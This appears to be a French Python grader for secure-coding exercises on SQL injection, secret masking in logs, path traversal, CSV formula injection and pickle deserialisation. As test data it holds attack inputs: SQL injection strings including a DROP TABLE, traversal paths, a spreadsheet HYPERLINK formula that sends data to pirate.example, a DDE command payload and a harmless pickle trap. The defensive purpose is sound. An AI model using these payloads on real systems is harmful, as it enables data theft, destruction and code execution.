"""Vérifications automatiques de la série 13 (lisez-les si vous êtes bloqué·e : ce sont des indices).

Pour chaque défi, le correcteur joue d'abord l'utilisateur honnête : votre code doit marcher, y
compris sur les cas inhabituels mais légitimes (« D'Almeida », « rapport..v2.csv », un nombre
négatif). Puis il joue l'attaquant : il envoie les entrées piégées qu'on retrouve dans les vrais
rapports d'incident et vérifie que l'attaque échoue, sans rien casser au passage.

Tout reste dans votre ordinateur : base SQLite en mémoire, dossiers temporaires, et un fichier
« piégé » dont le seul effet est de noter qu'il a été exécuté.
"""

from __future__ import annotations

import ast
import builtins
import copy
import hashlib
import inspect
import io
import os
import pickle
import re
import sqlite3
import tempfile
import textwrap
import warnings
from pathlib import Path

import pandas as pd

from .verif import Defi, Serie

MOTS_SENSIBLES = ("password", "mot_de_passe", "secret", "token", "api_key", "authorization")
MASQUE = "***"
DEBUTS_DANGEREUX = ("=", "+", "-", "@", "\t", "\r")

_CLIENTS = [  # insérés dans le désordre : l'ordre de la table n'est pas l'ordre des identifiants
    ("C004", "Martin", "Mensuel", 89.9),
    ("C001", "Martin", "Annuel", 45.0),
    ("C006", "Martin", "Mensuel", 60.0),
    ("C002", "D'Almeida", "Mensuel", 70.5),
    ("C005", "martin", "Biannuel", 99.0),
    ("C003", "Zébulon", "Biannuel", 55.0),
]


def _base() -> sqlite3.Connection:
    connexion = sqlite3.connect(":memory:")
    connexion.execute("CREATE TABLE clients (id TEXT PRIMARY KEY, nom TEXT NOT NULL, contrat TEXT NOT NULL, "
                      "facture_mensuelle REAL NOT NULL)")
    connexion.executemany("INSERT INTO clients VALUES (?, ?, ?, ?)", _CLIENTS)
    connexion.commit()
    return connexion


def _court(valeur, n: int = 140) -> str:
    texte = repr(valeur)
    return texte if len(texte) <= n else texte[: n - 1] + "…"


# ============================================================================ Défi 80 : injection SQL


class _CurseurEspion:
    """Un vrai curseur SQLite, qui note au passage le texte SQL de chaque requête."""

    def __init__(self, curseur: sqlite3.Cursor, journal: list[str]) -> None:
        self._curseur, self._journal = curseur, journal

    def execute(self, sql, *parametres):
        self._journal.append(str(sql))
        self._curseur.execute(sql, *parametres)
        return self

    def executemany(self, sql, *parametres):
        self._journal.append(str(sql))
        self._curseur.executemany(sql, *parametres)
        return self

    def executescript(self, script):
        self._journal.append(str(script))
        self._curseur.executescript(script)
        return self

    def __iter__(self):
        return iter(self._curseur)

    def __getattr__(self, nom):
        return getattr(self._curseur, nom)


class _ConnexionEspion:
    """Se comporte comme la connexion SQLite reçue, mais garde le texte de chaque requête envoyée."""

    def __init__(self, connexion: sqlite3.Connection) -> None:
        object.__setattr__(self, "_connexion", connexion)
        object.__setattr__(self, "_requetes", [])

    def execute(self, sql, *parametres):
        return self.cursor().execute(sql, *parametres)

    def executemany(self, sql, *parametres):
        return self.cursor().executemany(sql, *parametres)

    def executescript(self, script):
        return self.cursor().executescript(script)

    def cursor(self, *args, **kwargs):
        return _CurseurEspion(self._connexion.cursor(*args, **kwargs), self._requetes)

    def __enter__(self):
        self._connexion.__enter__()
        return self

    def __exit__(self, *exc):
        return self._connexion.__exit__(*exc)

    def __getattr__(self, nom):
        return getattr(self._connexion, nom)

    def __setattr__(self, nom, valeur):  # ex. connexion.row_factory = sqlite3.Row
        setattr(self._connexion, nom, valeur)


_APOSTROPHE = ("C'est la signature d'une requête construite en collant la valeur dans le texte SQL (f-string, "
               "`+`, `%` ou `.format`) : la valeur est devenue du SQL. Laissez un `?` dans la requête et passez "
               "la valeur à part : `connexion.execute(\"SELECT id FROM clients WHERE nom = ?\", (nom,))`.")


def _appel_80(f, connexion: _ConnexionEspion, nom: str, contrat: str | None, avec_contrat: bool):
    description = f"clients_par_nom(connexion, {nom!r}" + (f", contrat={contrat!r})" if avec_contrat else ")")
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")  # pandas prévient qu'il ne connaît pas notre connexion espion
            resultat = f(connexion, nom, contrat=contrat) if avec_contrat else f(connexion, nom)
    except NotImplementedError:
        raise
    except Exception as exc:  # noqa: BLE001
        # sqlite3.Error, ou pandas.errors.DatabaseError si l'élève passe par pd.read_sql_query
        if not (isinstance(exc, sqlite3.Error) or type(exc).__name__ == "DatabaseError"):
            raise
        texte = str(exc).rstrip(".")
        if "Incorrect number of bindings" in texte:
            raise AssertionError(
                f"`{description}` plante : {type(exc).__name__}: {texte}. Les paramètres doivent être un tuple ou "
                "une liste : `(nom)` n'est PAS un tuple, c'est juste `nom` entre parenthèses, et SQLite voit alors "
                "une suite de lettres. Écrivez `(nom,)` (avec la virgule) ou `[nom]`.") from None
        if "one statement at a time" in texte:
            raise AssertionError(
                f"`{description}` plante ({texte}) : le « ; » contenu dans le nom a été lu comme la fin d'une "
                f"requête SQL, et le reste comme une deuxième requête (ici, effacer la table). {_APOSTROPHE}") from None
        if "'" in nom or '"' in nom:
            raise AssertionError(
                f"`{description}` plante ({type(exc).__name__}: {texte}) : le guillemet contenu dans le nom a FERMÉ "
                f"la chaîne de texte de votre requête, et la suite a été lue comme du SQL. {_APOSTROPHE}") from None
        raise AssertionError(f"`{description}` plante dans SQLite : {type(exc).__name__}: {texte}. Essayez votre "
                             "requête avec `base_exemple()` (voir le haut de defis/serie_13.py).") from None
    if resultat is None:
        raise AssertionError(f"`{description}` renvoie None : avez-vous oublié le `return` ?")
    if not isinstance(resultat, list):
        raise AssertionError(f"`{description}` doit renvoyer une liste d'identifiants, pas un objet de type "
                             f"{type(resultat).__name__} (`list(...)` ou une liste en compréhension).")
    if resultat and not all(isinstance(x, str) for x in resultat):
        raise AssertionError(f"`{description}` renvoie {_court(resultat)} : chaque ligne de SQLite est un tuple. "
                             "Gardez seulement l'identifiant : `[ligne[0] for ligne in connexion.execute(...)]`.")
    return resultat


def _valeur_collee(connexion: _ConnexionEspion, valeur: str) -> str | None:
    return next((sql for sql in connexion._requetes if valeur in sql), None)


def _executer_80(f, nom: str, contrat: str | None = None, avec_contrat: bool = False):
    connexion = _ConnexionEspion(_base())
    return _appel_80(f, connexion, nom, contrat, avec_contrat), connexion


def _clients_restants(connexion: _ConnexionEspion) -> int:
    try:
        return connexion._connexion.execute("SELECT COUNT(*) FROM clients").fetchone()[0]
    except sqlite3.Error:
        return 0


def verifier_clients_par_nom(f) -> None:
    # 1. L'usage honnête.
    obtenu, _ = _executer_80(f, "Martin")
    attendu = ["C001", "C004", "C006"]
    if obtenu != attendu:
        if sorted(obtenu) == attendu:
            raise AssertionError(f"`clients_par_nom(connexion, 'Martin')` renvoie {obtenu} : les bons clients, mais pas "
                                 f"dans l'ordre des identifiants ({attendu}). Ajoutez `ORDER BY id` à la requête.")
        if obtenu == []:
            avec_contrat, _ = _executer_80(f, "Martin", "Annuel", True)
            if avec_contrat == ["C001"]:
                raise AssertionError(
                    "`clients_par_nom(connexion, 'Martin')` renvoie [] alors qu'avec contrat='Annuel' vous trouvez C001. "
                    "Sans contrat (None), n'ajoutez PAS la condition : en SQL, `contrat = NULL` n'est jamais vrai, donc "
                    "plus aucun client ne passe. Construisez la requête morceau par morceau : "
                    "`if contrat is not None: sql += \" AND contrat = ?\"`.")
        if "C005" in obtenu:
            raise AssertionError(f"`clients_par_nom(connexion, 'Martin')` renvoie {obtenu}, avec C005 qui s'appelle "
                                 "« martin » (minuscule). La recherche porte sur le nom EXACT : `nom = ?`, sans LIKE ni "
                                 "LOWER (LIKE ignore les majuscules en SQLite).")
        raise AssertionError(f"`clients_par_nom(connexion, 'Martin')` renvoie {obtenu} au lieu de {attendu}.")

    # 2. La valeur voyage-t-elle à part, ou est-elle collée dans le texte SQL ?
    obtenu, connexion = _executer_80(f, "Zébulon")
    if obtenu != ["C003"]:
        raise AssertionError(f"`clients_par_nom(connexion, 'Zébulon')` renvoie {obtenu} au lieu de ['C003'].")
    requete = _valeur_collee(connexion, "Zébulon")
    if requete is not None:
        try:
            attaque, _ = _executer_80(f, "' OR '1'='1")
            consequence = (f" Essayez le nom « ' OR '1'='1 » : votre fonction renvoie {attaque}, soit TOUTE la table."
                           if attaque else "")
        except AssertionError:
            consequence = ""
        raise AssertionError(
            f"Votre requête contient le nom en toutes lettres : {_court(requete, 120)}. Elle marche avec Zébulon, mais "
            f"le texte SQL est alors écrit en partie par l'utilisateur.{consequence} Laissez un `?` dans la requête "
            "et passez la valeur à part : `connexion.execute(\"... WHERE nom = ?\", (nom,))`. Même si vous doublez "
            "les apostrophes, ne recopiez pas la valeur dans le texte : c'est le travail de SQLite.")

    # 3. Le filtre facultatif.
    for avec_contrat, contrat, attendu, nom_cas in [
        (True, "Mensuel", ["C004", "C006"], "contrat='Mensuel'"),
        (True, "Annuel", ["C001"], "contrat='Annuel'"),
        (True, None, ["C001", "C004", "C006"], "contrat=None"),
    ]:
        obtenu, connexion = _executer_80(f, "Martin", contrat, avec_contrat)
        if obtenu != attendu:
            if contrat is None and obtenu == []:
                raise AssertionError(
                    "`clients_par_nom(connexion, 'Martin', contrat=None)` renvoie [] : quand `contrat` vaut None, "
                    "n'ajoutez PAS la condition. En SQL, `contrat = NULL` n'est jamais vrai, donc plus aucun client ne "
                    "passe. Construisez la requête morceau par morceau : `if contrat is not None: sql += \" AND contrat = ?\"`.")
            raise AssertionError(f"`clients_par_nom(connexion, 'Martin', {nom_cas})` renvoie {obtenu} au lieu de {attendu}.")
        if contrat and (requete := _valeur_collee(connexion, contrat)) is not None:
            raise AssertionError(f"Le contrat est collé dans le texte SQL ({_court(requete, 120)}) : il vient lui aussi "
                                 "de l'extérieur (un menu déroulant se trafique facilement). Passez-le par un `?`, comme le nom.")

    # 4. Un nom honnête qui contient une apostrophe.
    obtenu, _ = _executer_80(f, "D'Almeida")
    if obtenu != ["C002"]:
        raise AssertionError(f"`clients_par_nom(connexion, \"D'Almeida\")` renvoie {obtenu} au lieu de ['C002'] : "
                             "l'apostrophe fait partie du nom. Avec un `?`, SQLite s'en occupe.")

    # 5. Les attaques classiques : chacune doit être un nom comme un autre, qui ne trouve personne.
    for nom, contrat, avec_contrat, effet in [
        ("' OR '1'='1", None, False, "renvoie toute la table"),
        ("' OR 1=1 --", None, False, "renvoie toute la table (`--` met la fin de la requête en commentaire)"),
        ('" OR "1"="1', None, False, "renvoie toute la table (SQLite accepte aussi les guillemets doubles)"),
        ("Martin' --", "Annuel", True, "supprime le filtre sur le contrat (`--` met le reste en commentaire)"),
        ("x'; DROP TABLE clients; --", None, False, "tente d'effacer la table"),
    ]:
        obtenu, connexion = _executer_80(f, nom, contrat, avec_contrat)
        if _clients_restants(connexion) != len(_CLIENTS):
            raise AssertionError(f"Avec le nom {nom!r}, la table `clients` a été modifiée ou effacée. {_APOSTROPHE}")
        if obtenu:
            appel = f"clients_par_nom(connexion, {nom!r}" + (f", contrat={contrat!r})" if avec_contrat else ")")
            raise AssertionError(f"INJECTION SQL : `{appel}` renvoie {obtenu}. Personne ne s'appelle ainsi : le nom a "
                                 f"été exécuté comme du SQL et {effet}. {_APOSTROPHE}")


# ============================================================================ Défi 81 : secrets et journaux


def _reference_masquer(donnees):
    def sensible(cle) -> bool:
        nom = str(cle).lower().replace("-", "_")
        return any(mot in nom for mot in MOTS_SENSIBLES)

    def valeur(v):
        if isinstance(v, dict):
            return _reference_masquer(v)
        if isinstance(v, list):
            return [valeur(x) for x in v]
        return v

    return {k: MASQUE if sensible(k) else valeur(v) for k, v in donnees.items()}


def _appel_81(f, donnees: dict, cas: str):
    original = copy.deepcopy(donnees)
    resultat = f(donnees)
    if donnees != original:
        raise AssertionError(
            f"Votre fonction a MODIFIÉ le dictionnaire reçu ({cas}). Or ce dictionnaire sert encore à traiter la requête : "
            "la suite du code utiliserait « *** » comme clé d'API ! Construisez un NOUVEAU dictionnaire (`{...}` en "
            "compréhension, ou `copy.deepcopy`). Attention : `dict(donnees)` et `.copy()` ne copient pas les "
            "dictionnaires imbriqués.")
    if resultat is None:
        raise AssertionError("`masquer_secrets(...)` renvoie None : avez-vous oublié le `return` ?")
    if not isinstance(resultat, dict):
        raise AssertionError(f"`masquer_secrets(...)` doit renvoyer un dictionnaire, pas {type(resultat).__name__}.")
    absents = [k for k in donnees if k not in resultat]
    if absents:
        raise AssertionError(f"Ces clés ont disparu du résultat ({cas}) : {', '.join(map(str, absents))}. Remplacez la "
                             "VALEUR par MASQUE, sans supprimer la clé : en lisant le journal, on doit pouvoir savoir "
                             "qu'un en-tête « Authorization » était bien présent dans la requête.")
    return resultat


def _ecarts(obtenu, attendu, chemin: str = "") -> list[tuple[str, object, object]]:
    """Les endroits (« headers.X-API-Key ») où le résultat diffère de l'attendu : (chemin, obtenu, attendu)."""
    if isinstance(attendu, dict) and isinstance(obtenu, dict):
        ecarts = [(f"{chemin}{k} (absent)", None, attendu[k]) for k in attendu if k not in obtenu]
        ecarts += [(f"{chemin}{k} (en trop)", obtenu[k], None) for k in obtenu if k not in attendu]
        for k in attendu:
            if k in obtenu:
                ecarts += _ecarts(obtenu[k], attendu[k], f"{chemin}{k}.")
        return ecarts
    if isinstance(attendu, list) and isinstance(obtenu, list) and len(attendu) == len(obtenu):
        racine = chemin.rstrip(".")
        return [e for i, (o, a) in enumerate(zip(obtenu, attendu)) for e in _ecarts(o, a, f"{racine}[{i}].")]
    if obtenu != attendu or type(obtenu) is not type(attendu):
        return [(chemin.rstrip(".") or "(racine)", obtenu, attendu)]
    return []


def _chemins_differents(obtenu, attendu) -> list[str]:
    return [chemin for chemin, _, _ in _ecarts(obtenu, attendu)]


def _types_changes(obtenu, attendu) -> list[str]:
    """Les valeurs devenues du texte : 0.8 → « 0.8 », None → « None »."""
    return [chemin for chemin, o, a in _ecarts(obtenu, attendu)
            if a != MASQUE and isinstance(o, str) and not isinstance(a, str) and o == str(a)]


def verifier_masquer_secrets(f) -> None:
    simple = {"client_id": "C001", "password": "hunter2", "offre": "remise_10"}
    obtenu = _appel_81(f, simple, "requête simple")
    attendu = _reference_masquer(simple)
    if obtenu != attendu:
        raise AssertionError(f"`masquer_secrets({simple})` renvoie {obtenu} au lieu de {attendu}. Une clé sensible voit "
                             f"sa valeur remplacée par MASQUE ({MASQUE!r}) ; les autres restent identiques.")

    entetes = {"Authorization": "Bearer eyJhbGciOi", "X-API-Key": "cle-equipe-data", "access_token": "t0k3n",
               "Mot_De_Passe": "azerty", "client-secret": "s3cr3t", "contrat": "Mensuel", "Accept": "application/json"}
    obtenu = _appel_81(f, entetes, "en-têtes HTTP")
    oublies = [k for k in entetes if _reference_masquer(entetes)[k] == MASQUE and obtenu[k] != MASQUE]
    if oublies:
        if "Authorization" in oublies or "Mot_De_Passe" in oublies:
            conseil = ("Les noms de clés n'ont pas de casse fixe (« Authorization », « authorization ») : comparez "
                       "des noms mis en minuscules, `cle.lower()`.")
        elif "access_token" in oublies:
            conseil = ("Une clé est sensible si son nom CONTIENT un des mots (« access_token » contient « token ») : "
                       "`any(mot in nom for mot in MOTS_SENSIBLES)`, et pas `nom in MOTS_SENSIBLES`.")
        else:
            conseil = ("Les en-têtes HTTP s'écrivent avec des tirets : « X-API-Key » en minuscules donne « x-api-key », "
                       "qui ne contient pas « api_key ». Normalisez : `cle.lower().replace(\"-\", \"_\")`.")
        raise AssertionError(f"Ces secrets restent en clair dans le journal : {', '.join(oublies)}. {conseil}")
    trop = [k for k in ("contrat", "Accept") if obtenu.get(k) != entetes[k]]
    if trop:
        raise AssertionError(f"Vous avez modifié des valeurs qui ne sont pas des secrets ({', '.join(trop)}) : un journal "
                             "illisible ne sert plus à rien. Ne masquez que les clés dont le nom contient un mot sensible.")
    if obtenu != _reference_masquer(entetes):
        raise AssertionError(f"Pour les en-têtes {entetes}, attendu {_reference_masquer(entetes)}, obtenu {obtenu}.")

    requete = {
        "methode": "POST",
        "headers": {"X-API-Key": "cle-equipe-data", "Accept": "application/json"},
        "corps": {
            "clients": [{"id": "C001", "token": "t1"}, {"id": "C002", "score": 0.8}],
            "tags": ["vip", "relance"],
            "secret": {"niveau": 2, "code": "1234"},
        },
    }
    obtenu = _appel_81(f, requete, "requête avec des dictionnaires imbriqués")
    attendu = _reference_masquer(requete)
    if obtenu != attendu:
        ecarts = _chemins_differents(obtenu, attendu)
        if _types_changes(obtenu, attendu):
            raise AssertionError(f"Requête imbriquée : {', '.join(_types_changes(obtenu, attendu))} a changé de TYPE. Les "
                                 "valeurs qui ne sont pas des secrets sont recopiées telles quelles : le nombre 0.8 reste "
                                 "un nombre, pas le texte « 0.8 ».")
        if any(e.startswith("headers") for e in ecarts):
            conseil = ("La clé d'API est rangée DANS le dictionnaire `headers` : quand une valeur est elle-même un "
                       "dictionnaire, appelez `masquer_secrets` sur elle (récursion).")
        elif any(e.startswith("corps.clients") for e in ecarts):
            conseil = ("Un des secrets est dans une LISTE de dictionnaires (`corps.clients[0].token`) : quand une valeur "
                       "est une liste, traitez chacun de ses éléments (`[... for element in valeur]`).")
        elif "corps.secret" in ecarts or any(e.startswith("corps.secret") for e in ecarts):
            conseil = ("La clé « secret » contient un dictionnaire : comme toute clé sensible, sa valeur ENTIÈRE est "
                       "remplacée par MASQUE, quelle qu'elle soit.")
        else:
            conseil = "Les valeurs qui ne sont pas des secrets (listes de textes, nombres) restent identiques."
        raise AssertionError(f"Requête imbriquée : votre résultat diffère de l'attendu à ces endroits : "
                             f"{', '.join(ecarts[:5])}. {conseil}")

    types = {"facture": 89.9, "actif": True, "note": None, "nb_appels": 3, "token": None, "refresh-token": 1234}
    obtenu = _appel_81(f, types, "valeurs de types variés")
    attendu = _reference_masquer(types)
    ecarts = _chemins_differents(obtenu, attendu)
    if ecarts:
        raise AssertionError(f"`masquer_secrets({types})` renvoie {obtenu} au lieu de {attendu} (écarts : "
                             f"{', '.join(ecarts)}). Une clé sensible est masquée quelle que soit sa valeur (même None "
                             "ou un nombre), et les autres valeurs gardent leur type : 3 reste 3, pas « 3 ».")
    if _appel_81(f, {}, "dictionnaire vide") != {}:
        raise AssertionError("`masquer_secrets({})` doit renvoyer {}.")


# ============================================================================ Défi 82 : traversée de répertoire


def _bac_a_sable(racine: Path) -> tuple[Path, bool]:
    exports = racine / "exports"
    (exports / "equipe").mkdir(parents=True)
    (racine / "exports_pirate").mkdir()
    (racine / "ailleurs").mkdir()
    try:
        (exports / "raccourci").symlink_to(racine / "ailleurs", target_is_directory=True)
        return exports, True
    except (OSError, NotImplementedError):  # Windows sans droits de création de liens : on saute ce cas
        return exports, False


def _appel_82(f, dossier: Path, nom: str):
    resultat = f(dossier, nom)
    if resultat is None:
        raise AssertionError(f"`chemin_export(dossier, {nom!r})` renvoie None : avez-vous oublié le `return` ? Pour "
                             "refuser un nom, levez une ValueError ; sinon, renvoyez le chemin.")
    try:
        return Path(resultat)
    except TypeError:
        raise AssertionError(f"`chemin_export(dossier, {nom!r})` doit renvoyer un chemin (`Path`), pas "
                             f"{type(resultat).__name__}.") from None


_CONSEILS_REFUS = {
    "traversee": "Chaque « .. » remonte d'un dossier. Calculez le chemin RÉEL avec `(racine / nom_fichier).resolve()`, "
                 "puis vérifiez qu'il est bien dans le dossier : `chemin.is_relative_to(racine)`.",
    "absolu": "`dossier / '/un/chemin/absolu'` donne '/un/chemin/absolu' : un nom absolu REMPLACE le dossier. Vérifiez "
              "le chemin obtenu avec `chemin.is_relative_to(racine)` plutôt que de faire confiance au nom.",
    "prefixe": "« …/exports_pirate » commence par le TEXTE « …/exports » : `str(chemin).startswith(str(racine))` compare "
               "des lettres, pas des dossiers. Comparez des chemins : `chemin.is_relative_to(racine)`.",
    "dossier": "Ce nom désigne le dossier d'export LUI-MÊME, pas un fichier qu'il contient : refusez aussi "
               "`chemin == racine`.",
    "lien": "« raccourci » est un lien symbolique vers un autre dossier. Seul `.resolve()` suit les liens "
            "(`os.path.abspath` et `os.path.normpath` ne le font pas) : vérifiez le chemin RÉSOLU.",
}


def verifier_chemin_export(f) -> None:
    with tempfile.TemporaryDirectory() as tmp:
        racine_tmp = Path(tmp)
        exports, avec_lien = _bac_a_sable(racine_tmp)
        reel = exports.resolve()

        # 1. Les noms honnêtes, y compris inhabituels.
        for nom, si_refus in [
            ("clients_a_risque.csv", "C'est le cas le plus simple : `(racine / nom_fichier).resolve()`."),
            ("equipe/clients.csv", "Les sous-dossiers du dossier d'export sont autorisés : ils restent DANS le dossier."),
            ("nouveau_dossier/clients.csv", "Un sous-dossier qui n'existe pas encore reste dans le dossier d'export : "
                                            "`.resolve()` fonctionne aussi sur un chemin qui n'existe pas."),
            ("rapport..v2.csv", "Ce nom contient « .. » au milieu d'un nom de fichier, mais ne remonte d'aucun dossier. "
                                "Chercher « .. » dans le texte refuse des noms honnêtes (et laisse passer un chemin "
                                "absolu) : vérifiez plutôt où mène le chemin RÉSOLU."),
            ("équipe data 2026.csv", "Accents et espaces sont autorisés dans un nom de fichier."),
        ]:
            try:
                obtenu = _appel_82(f, exports, nom)
            except ValueError as exc:
                raise AssertionError(f"`chemin_export(dossier, {nom!r})` est refusé ({exc}). {si_refus}") from None
            if obtenu.resolve() != (reel / nom).resolve():
                raise AssertionError(f"`chemin_export(dossier, {nom!r})` renvoie {obtenu} au lieu de {(reel / nom).resolve()}.")

        # 2. Un dossier donné en chemin RELATIF, comme Path("exports") dans le tableau de bord.
        dossier_courant = os.getcwd()
        try:
            os.chdir(racine_tmp)
            try:
                obtenu = _appel_82(f, Path("exports"), "clients.csv")
            except ValueError:
                raise AssertionError(
                    "Avec un dossier RELATIF (`Path(\"exports\")`), le nom honnête « clients.csv » est refusé. Le chemin "
                    "résolu est absolu, le dossier non : ils ne se comparent pas. Résolvez AUSSI le dossier : "
                    "`racine = Path(dossier).resolve()`.") from None
            if obtenu.resolve() != reel / "clients.csv":
                raise AssertionError(f"Avec le dossier relatif `Path(\"exports\")`, attendu {reel / 'clients.csv'}, "
                                     f"obtenu {obtenu}.")
        finally:
            os.chdir(dossier_courant)

        # 3. Les attaques : chacune doit lever une ValueError.
        attaques = [
            ("../secrets.csv", "traversee"),
            ("equipe/../../secrets.csv", "traversee"),
            (str(racine_tmp / "ailleurs" / "vol.csv"), "absolu"),
            ("../exports_pirate/clients.csv", "prefixe"),
            ("", "dossier"),
            (".", "dossier"),
            ("equipe/..", "dossier"),
        ]
        if avec_lien:
            attaques.append(("raccourci/clients.csv", "lien"))
        for nom, genre in attaques:
            try:
                obtenu = _appel_82(f, exports, nom)
            except ValueError:
                continue
            except OSError as exc:
                raise AssertionError(f"`chemin_export(dossier, {nom!r})` lève {type(exc).__name__} : refusez un nom "
                                     "dangereux avec une ValueError, comme le demande la docstring.") from None
            if genre == "dossier":
                ou = f"c'est le dossier d'export lui-même ({reel})"
            else:
                destination = f", qui mène à {obtenu.resolve()}" if obtenu.resolve() != obtenu else ""
                ou = f"{obtenu}{destination}, hors du dossier d'export {reel}"
            raise AssertionError(f"`chemin_export(dossier, {nom!r})` est ACCEPTÉ et renvoie {ou}. {_CONSEILS_REFUS[genre]}")


# ============================================================================ Défi 83 : injection de formules


def _tableau_83() -> pd.DataFrame:
    index = pd.Index([f"C00{i}" for i in range(1, 9)], name="id")
    return pd.DataFrame({
        "nom": ["Martin", '=HYPERLINK("http://pirate.example/?"&A1;"Cliquez ici")', "+33 6 12 34 56 78", "-Dupont",
                "@lea_m", "\t=1+1", "remise=10%", None],
        "facture": [89.9, -12.5, 45.0, 0.0, 10.0, 20.0, 30.0, 40.0],
        "solde_points": [-3, 0, 5, 12, -40, 7, 0, 1],
        "commentaire": ["ok", 42, -7, "=2*3", None, 3.5, "\r=cmd|' /C calc'!A0", "'=déjà protégé"],
    }, index=index)


def _reference_cellule(valeur):
    return "'" + valeur if isinstance(valeur, str) and valeur.startswith(DEBUTS_DANGEREUX) else valeur


def _manquant(v) -> bool:
    try:
        return bool(pd.isna(v))
    except (TypeError, ValueError):
        return False


def _meme_cellule(a, b) -> bool:
    if _manquant(a) or _manquant(b):
        return _manquant(a) and _manquant(b)
    return type(a) is type(b) and a == b if isinstance(b, str) else (not isinstance(a, str) and a == b)


def _appel_83(f, df: pd.DataFrame) -> pd.DataFrame:
    avant = df.copy(deep=True)
    resultat = f(df)
    if not df.equals(avant):
        raise AssertionError("Votre fonction a modifié le tableau REÇU. Le tableau d'origine sert encore ailleurs (le "
                             "tableau de bord l'affiche) : travaillez sur une copie, `resultat = df.copy()`.")
    if resultat is None:
        raise AssertionError("`neutraliser_formules(df)` renvoie None : avez-vous oublié le `return` ?")
    if not isinstance(resultat, pd.DataFrame):
        raise AssertionError(f"`neutraliser_formules(df)` doit renvoyer un DataFrame, pas {type(resultat).__name__}.")
    if list(resultat.columns) != list(df.columns) or not resultat.index.equals(df.index):
        raise AssertionError("Le tableau renvoyé doit garder les mêmes colonnes, dans le même ordre, et le même index "
                             f"(ici les identifiants clients). Colonnes obtenues : {list(resultat.columns)}.")
    return resultat


def verifier_neutraliser_formules(f) -> None:
    df = _tableau_83()
    resultat = _appel_83(f, df)

    for colonne in ("facture", "solde_points"):
        if not pd.api.types.is_numeric_dtype(resultat[colonne]) or resultat[colonne].tolist() != df[colonne].tolist():
            raise AssertionError(
                f"La colonne numérique « {colonne} » a changé : {_court(resultat[colonne].tolist())} au lieu de "
                f"{df[colonne].tolist()}. Un nombre ne peut pas être une formule : -12.5 doit rester le NOMBRE -12.5 "
                "(transformé en texte, il casse les sommes du fichier Excel). Ne touchez qu'au texte : "
                "`isinstance(valeur, str)`.")

    ecarts = []
    for colonne in ("nom", "commentaire"):
        for cle in df.index:
            avant, apres = df.at[cle, colonne], resultat.at[cle, colonne]
            if not _meme_cellule(apres, _reference_cellule(avant)):
                ecarts.append((colonne, cle, avant, apres))
    if not ecarts:
        # Neutraliser deux fois ne doit rien changer de plus : « '=1+1 » est déjà du texte inoffensif.
        deux_fois = _appel_83(f, resultat.copy())
        if not deux_fois.equals(resultat):
            raise AssertionError("Appliquée deux fois, votre fonction ajoute une deuxième apostrophe. Une cellule qui "
                                 "commence par « ' » ne commence plus par un caractère dangereux : laissez-la telle quelle.")
        return

    def montrer(e):
        colonne, cle, avant, apres = e
        return f"{colonne}[{cle}] : {avant!r} → {apres!r} (attendu {_reference_cellule(avant)!r})"

    nombres = [e for e in ecarts if not isinstance(e[2], str) and not _manquant(e[2])]
    if nombres:
        raise AssertionError(f"{montrer(nombres[0])}. Dans une colonne qui mélange texte et nombres, un nombre (comme -7) "
                             "n'est pas une formule : ne neutralisez que le texte, `isinstance(valeur, str)`.")
    manquants = [e for e in ecarts if _manquant(e[2])]
    if manquants:
        raise AssertionError(f"{montrer(manquants[0])}. Une valeur manquante doit rester manquante : transformer None en "
                             "texte (« None », « nan ») invente une donnée. Ne touchez qu'au texte.")
    deja = [e for e in ecarts if isinstance(e[2], str) and e[2].startswith("'")]
    if deja and not any(e[2] == "remise=10%" for e in ecarts):
        raise AssertionError(f"{montrer(deja[0])}. Cette cellule commence par une apostrophe : elle est déjà du texte "
                             "pour Excel, et l'apostrophe ne fait pas partie de DEBUTS_DANGEREUX. Laissez-la telle quelle "
                             "(sinon, exporter deux fois le même fichier ajoute des apostrophes à chaque fois).")
    milieu = [e for e in ecarts if e[2] == "remise=10%"]
    if milieu:
        raise AssertionError(f"{montrer(milieu[0])}. Seul le PREMIER caractère compte : Excel ne lit une formule que si la "
                             "cellule COMMENCE par = + - @, une tabulation ou un retour chariot. `valeur.startswith(...)`, "
                             "pas `in`.")
    oublies = [e for e in ecarts if isinstance(e[2], str) and e[3] == e[2]]
    if oublies:
        debuts = sorted({repr(e[2][0]) for e in oublies})
        raise AssertionError(f"{montrer(oublies[0])}. Les cellules qui commencent par {', '.join(debuts)} ne sont pas "
                             "neutralisées. Excel traite comme une formule tout texte qui commence par l'un des "
                             f"caractères de DEBUTS_DANGEREUX {DEBUTS_DANGEREUX!r} (« +33 6… » devient un calcul, "
                             "« @… » aussi). `str.startswith` accepte un tuple : `valeur.startswith(DEBUTS_DANGEREUX)`.")
    raise AssertionError(f"{montrer(ecarts[0])}. Ajoutez une apostrophe DEVANT la valeur, sans rien retirer ni changer : "
                         "supprimer le « - » de « -Dupont » abîme la donnée, alors que l'apostrophe dit seulement à Excel "
                         "« ceci est du texte » (elle ne s'affiche pas).")


# ============================================================================ Défi 84 : désérialisation


_PIEGES: list[str] = []


def _piege_declenche(message: str) -> dict:
    """Appelée par pickle PENDANT le chargement du fichier piégé : la preuve que du code s'est exécuté.

    Un vrai attaquant appellerait `os.system` à la place, avec les droits de votre API.
    """
    _PIEGES.append(message)
    return {"modele": "piégé"}


class _ObjetPiege:
    def __reduce__(self):
        return (_piege_declenche, ("le fichier piégé a exécuté du code pendant son chargement",))


_MODELE = {"modele": "logistique", "seuil": 0.4, "coefficients": [0.82, -1.27, 0.31]}


class _AttaquantRapide:
    """Remplace le fichier par la version piégée dès qu'on l'ouvre une DEUXIÈME fois.

    Il simule un attaquant qui change le fichier entre votre vérification et votre chargement.
    """

    def __init__(self, cible: Path, piege: Path) -> None:
        self.cible, self.piege, self.ouvertures = os.path.realpath(cible), str(piege), 0

    def __enter__(self):
        self._builtins_open, self._io_open = builtins.open, io.open
        vrai_open = self._io_open

        def open_surveille(fichier, mode="r", *args, **kwargs):
            try:
                meme = os.path.realpath(os.fspath(fichier)) == self.cible
            except TypeError:  # descripteur de fichier (un entier)
                meme = False
            if meme and "r" in mode:
                self.ouvertures += 1
                if self.ouvertures >= 2:
                    fichier = self.piege
            return vrai_open(fichier, mode, *args, **kwargs)

        builtins.open = io.open = open_surveille
        return self

    def __exit__(self, *exc):
        builtins.open, io.open = self._builtins_open, self._io_open
        return False


def _appel_84(f, chemin: Path, empreinte: str, description: str):
    """Renvoie (objet chargé, None), ou (None, ValueError levée). Toute autre exception est expliquée."""
    try:
        return f(chemin, empreinte), None
    except NotImplementedError:
        raise
    except ValueError as exc:
        return None, exc
